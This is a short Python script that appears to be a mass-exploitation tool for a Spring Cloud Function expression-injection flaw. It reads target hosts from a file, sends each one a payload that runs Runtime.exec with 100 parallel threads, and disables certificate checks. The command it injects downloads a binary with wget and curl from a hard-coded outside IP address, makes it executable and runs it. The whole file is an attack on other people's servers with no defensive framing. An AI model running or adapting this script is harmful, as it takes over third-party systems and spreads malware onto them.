import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp(host):
    host = host.strip()
    if host[:4] != "http":
        host = "https://" + host
    url = host + "/speltest"
    headers ={
        
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip,deflate',
        'Content-Length':'0'
    }
    data1="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("+cmd+")"
    
    try:
        r = requests.post(url=url, timeout=6, data=data1, verify=False,headers=headers)
        if r.status_code==200:
            print(url)
    except:
        pass


if __name__ == '__main__':
    cmd = "wget http://51.81.133.90/NWWW.6;curl -O http://51.81.133.90/NWWW.6;chmod 777 *;./NWWW.6"
    with ThreadPoolExecutor(max_workers=100) as pool:
        with open(sys.argv[1], 'r') as f:
            task = [pool.submit(exp, url) for url in f.readlines()]
